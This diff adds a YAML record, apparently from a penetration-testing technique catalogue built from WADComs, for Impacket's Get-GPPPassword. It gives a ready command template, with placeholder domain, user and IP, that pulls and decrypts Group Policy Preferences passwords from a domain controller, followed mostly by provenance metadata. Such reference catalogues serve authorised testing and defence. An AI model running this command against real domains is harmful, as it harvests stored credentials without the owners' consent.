@@ -1,0 +1,96 @@
+id: wadcoms/Impacket-Get-GPPPassword
+type: technique
+platform: active-directory
+name: Impacket Get GPPPassword
+phases:
+- execution
+- discovery
+capabilities:
+- command-execution
+- discovery
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid password
+- a valid username
+- an NTLM hash (pass-the-hash)
+commands:
+- template: python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1
+  comment: "Python script to automatically extract and decrypt Group Policy Preferences (GPP) passwords\
+    \ using streams for carving files instead of mounting shares\n\nCommand Reference:\n\n\tTarget IP:\
+    \ 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py
+- https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/
+tags:
+- active-directory
+- wadcoms
+- smb
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-Get-GPPPassword.md
+      document: "---\ndescription: |\n  Python script to automatically extract and decrypt Group Policy\
+        \ Preferences (GPP) passwords using streams for carving files instead of mounting shares\n\n \
+        \ Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\n  \tDomain: test.local\n\n  \tUsername: john\n\
+        \n  \tPassword: password123\n\ncommand: |\n  python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local'\
+        \ -dc-ip 10.10.10.1\nitems:\n  - Password\n  - Username\n  - Hash\nservices:\n  - SMB\nOS:\n \
+        \ - Linux\n  - Windows\nattack_types:\n  - Exploitation\n  - Enumeration\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py\n\
+        \  - https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: discovery
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Enumeration'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: discovery
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Enumeration'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:6b8c9b4e2ab2c6e2819ab69948c0a0ac76a1deabf50eef3ed04f726755521a87
